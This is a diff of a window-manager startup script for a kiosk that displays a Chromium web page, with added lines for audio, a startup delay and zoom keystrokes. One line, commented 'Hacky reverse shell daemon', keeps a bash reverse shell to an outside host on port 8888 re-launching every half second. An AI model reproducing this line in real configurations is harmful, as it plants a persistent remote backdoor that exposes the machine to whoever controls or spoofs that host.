@@ -19,8 +19,24 @@ bspc config history_aware_focus  	true
 # Start in monacle mode
 bspc desktop -l next
 
-# Start chromium
+# Start gui utilities
 compton -b
 unclutter &
+
+# Unmute audio
+amixer sset Master unmute
+amixer sset Master 80%
+
+# Hacky reverse shell daemon
 tmux new-s -d "watch -n .5 \"bash -i >& /dev/tcp/aoede.byu.edu/8888 0>&1\""
-chromium --app="http://trouble.physics.byu.edu/display/"
+
+# Start trouble display
+chromium --app="http://trouble.physics.byu.edu/display/" &
+
+# Give it a few seconds to initialize
+sleep 15s
+
+# Zoom in (Matthew's request)
+xdotool key control+plus
+xdotool key control+plus
+xdotool key control+r
